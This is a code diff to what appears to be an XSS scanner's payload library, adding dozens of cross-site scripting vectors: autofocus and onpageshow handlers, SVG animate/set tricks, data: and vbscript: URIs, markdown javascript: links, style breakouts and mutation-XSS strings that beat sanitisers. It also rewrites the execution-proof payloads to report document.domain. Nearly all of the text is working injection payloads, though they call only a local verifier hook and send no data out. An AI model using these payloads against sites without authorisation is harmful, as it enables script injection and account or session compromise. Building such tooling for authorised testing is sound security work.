@@ -25,7 +25,7 @@ PAYLOAD_LIST_DIR = Path(__file__).resolve().parent / "payload_lists"
 
 # Known attack types an operator can select from.
 ATTACK_TYPES = ["reflected", "stored", "cookie", "dom", "polyglot", "waf-bypass",
-                "wordlist", "header"]
+                "wordlist", "header", "mxss"]
 
 
 def new_canary() -> str:
@@ -90,6 +90,43 @@ _LIBRARY: list[Payload] = [
             "Breaks out of a double-quoted JS string."),
     Payload("js-close-script", "</script><script>/*{C}*/</script>", "script", "reflected", "high",
             "Terminates the inline script element entirely."),
+
+    # ---------------- more HTML5 event-handler tags (PayloadsAllTheThings) ----------------
+    Payload("html5-input-autofocus", "<input autofocus onfocus=/*{C}*/>", "html", "reflected", "high",
+            "autofocus fires onfocus with no user interaction."),
+    Payload("html5-select-autofocus", "<select autofocus onfocus=/*{C}*/><option>", "html", "reflected", "medium"),
+    Payload("html5-textarea-autofocus", "<textarea autofocus onfocus=/*{C}*/>", "html", "reflected", "medium"),
+    Payload("html5-body-onpageshow", "<body onpageshow=/*{C}*/>", "html", "reflected", "medium"),
+    Payload("html5-video-source", "<video><source onerror=/*{C}*/></video>", "html", "reflected", "medium"),
+    Payload("html5-marquee-onstart", "<marquee onstart=/*{C}*/>", "html", "reflected", "low"),
+
+    # ---------------- SVG vectors (PayloadsAllTheThings) ----------------
+    Payload("svg-script", "<svg><script>/*{C}*/</script></svg>", "html", "reflected", "high",
+            "Script element inside SVG."),
+    Payload("svg-animate-onbegin", "<svg><animate onbegin=/*{C}*/ attributeName=x dur=1s>", "html", "reflected", "medium"),
+    Payload("svg-set-onbegin", "<svg><set attributeName=x onbegin=/*{C}*/>", "html", "reflected", "medium"),
+
+    # ---------------- URI wrappers: data: / vbscript: (PayloadsAllTheThings) ----------------
+    Payload("url-data-html", "data:text/html,<script>/*{C}*/</script>", "url", "reflected", "medium",
+            "data: URI delivering HTML/JS in a navigational sink."),
+    Payload("url-vbscript", "vbscript:/*{C}*/", "url", "reflected", "low",
+            "Legacy vbscript: URI (old IE)."),
+
+    # ---------------- Markdown / CSS / XML sinks (PayloadsAllTheThings) ----------------
+    Payload("md-js-link", "[x](javascript:/*{C}*/)", "any", "reflected", "medium",
+            "Markdown link whose href becomes a javascript: URI when rendered."),
+    Payload("css-style-break", "</style><script>/*{C}*/</script>", "html", "reflected", "high",
+            "Breaks out of a <style> block back into HTML."),
+    Payload("xml-xhtml-script", "<script xmlns=\"http://www.w3.org/1999/xhtml\">/*{C}*/</script>",
+            "html", "reflected", "medium", "Script in the XHTML namespace (XML/XHTML sinks)."),
+
+    # ---------------- mutation XSS (mXSS) — browser re-parsing turns sanitized markup live ----
+    Payload("mxss-noscript", "<noscript><p title=\"</noscript><img src=x onerror=/*{C}*/>\">",
+            "html", "mxss", "high", "noscript mutation (DOMPurify-style); confirm in a browser."),
+    Payload("mxss-style-a", "<svg></p><style><a id=\"</style><img src=1 onerror=/*{C}*/>\">",
+            "html", "mxss", "high", "style/anchor re-parse mutation."),
+    Payload("mxss-listing", "<listing>&lt;img src=1 onerror=/*{C}*/&gt;</listing>",
+            "html", "mxss", "medium", "listing element entity re-interpretation."),
 
     # ---------------- url / href / src context ----------------
     Payload("url-javascript", "javascript:/*{C}*/", "url", "reflected", "medium",
@@ -167,17 +204,23 @@ def all_payloads(canary: str) -> list[Payload]:
 # headless verifier can confirm the JavaScript actually RAN (not just reflected).
 # They also fall back to alert('<canary>') for sinks where our hook is absent.
 # --------------------------------------------------------------------------- #
+# Each callback appends document.domain so the verifier can report WHICH origin
+# executed the payload (PayloadsAllTheThings recommends document.domain/origin
+# over alert(1), especially inside sandbox domains). The canary stays the prefix.
 _EXEC: list[Payload] = [
-    Payload("exec-script", "<script>window.__talxss('{C}')</script>", "html", "reflected", "high"),
-    Payload("exec-img-onerror", "<img src=x onerror=\"window.__talxss('{C}')\">", "html", "reflected", "high"),
-    Payload("exec-svg-onload", "<svg onload=\"window.__talxss('{C}')\">", "html", "reflected", "high"),
-    Payload("exec-attr-dq", "\"><img src=x onerror=\"window.__talxss('{C}')\">", "attr_double", "reflected", "high"),
-    Payload("exec-attr-sq", "'><img src=x onerror='window.__talxss(\"{C}\")'>", "attr_single", "reflected", "high"),
-    Payload("exec-js-break", "';window.__talxss('{C}');'", "script", "reflected", "high"),
-    Payload("exec-js-dqbreak", "\";window.__talxss('{C}');\"", "script", "reflected", "high"),
-    Payload("exec-close-script", "</script><script>window.__talxss('{C}')</script>", "script", "reflected", "high"),
-    Payload("exec-cookie", "<img src=x onerror=\"window.__talxss('{C}:'+document.cookie)\">",
-            "html", "cookie", "high", "Proves document.cookie is readable from executed JS (not sent anywhere)."),
+    Payload("exec-script", "<script>window.__talxss('{C}|'+document.domain)</script>", "html", "reflected", "high"),
+    Payload("exec-img-onerror", "<img src=x onerror=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "high"),
+    Payload("exec-svg-onload", "<svg onload=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "high"),
+    Payload("exec-svg-script", "<svg><script>window.__talxss('{C}|'+document.domain)</script></svg>", "html", "reflected", "high"),
+    Payload("exec-body-onpageshow", "<body onpageshow=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "medium"),
+    Payload("exec-input-autofocus", "<input autofocus onfocus=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "high"),
+    Payload("exec-attr-dq", "\"><img src=x onerror=\"window.__talxss('{C}|'+document.domain)\">", "attr_double", "reflected", "high"),
+    Payload("exec-attr-sq", "'><img src=x onerror='window.__talxss(\"{C}|\"+document.domain)'>", "attr_single", "reflected", "high"),
+    Payload("exec-js-break", "';window.__talxss('{C}|'+document.domain);'", "script", "reflected", "high"),
+    Payload("exec-js-dqbreak", "\";window.__talxss('{C}|'+document.domain);\"", "script", "reflected", "high"),
+    Payload("exec-close-script", "</script><script>window.__talxss('{C}|'+document.domain)</script>", "script", "reflected", "high"),
+    Payload("exec-cookie", "<img src=x onerror=\"window.__talxss('{C}|cookie-readable')\">",
+            "html", "cookie", "high", "Proves injected JS runs where document.cookie is reachable (nothing is sent anywhere)."),
 ]
 
 
